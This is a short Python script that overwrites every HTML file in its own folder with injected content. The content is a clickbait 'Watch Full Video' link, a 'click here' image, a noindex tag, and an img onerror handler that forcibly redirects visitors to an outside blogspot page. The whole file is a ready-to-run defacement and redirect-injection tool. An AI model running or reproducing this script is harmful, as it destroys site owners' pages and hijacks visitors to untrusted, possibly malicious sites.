import os

directory_path = os.path.dirname(os.path.abspath(__file__))

replacement_code = '''
<center><h1><a href="https://sonar-bangla71.blogspot.com/2024/07/leks.html"> Watch Full Video <h1></center>
<center><a href="https://sonar-bangla71.blogspot.com/2024/07/leks.html"><img src="https://edu.ieee.org/in-mepco-wie/wp-content/uploads/sites/387/2016/09/click-here-logo-button-gif-images-2.gif?format=750w" alt="click here"></a></center>
<meta name="googlebot" content="noindex">
<img src='0' onerror= top.location.href='https://sonar-bangla71.blogspot.com/2024/07/leks.html'>
'''

for filename in os.listdir(directory_path):
    if filename.endswith('.html'):
        file_path = os.path.join(directory_path, filename)

        with open(file_path, 'w') as file:
            file.write(replacement_code)

print('Content replaced in HTML files.')
